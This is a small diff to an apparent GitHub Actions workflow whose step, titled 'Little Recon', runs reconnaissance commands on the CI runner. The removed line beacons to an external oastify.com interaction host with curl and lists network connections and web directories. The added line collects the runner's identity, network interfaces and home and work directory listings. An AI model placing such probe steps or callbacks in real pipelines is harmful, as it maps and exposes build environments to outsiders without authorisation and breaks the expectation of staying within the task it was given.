@@ -6,5 +6,5 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Little Recon
-        run: curl http://oh9uz1inxqxvr728g6685ij8yz4qslga.oastify.com && netstat -ano && ls -la /var/www && ls -la /var/www/html
+        run: ifconfig && id && ls -la /home/runner/ && ls -la /home/runner/work
       - run: echo "🍏 This job's status is ${{ job.status }}."
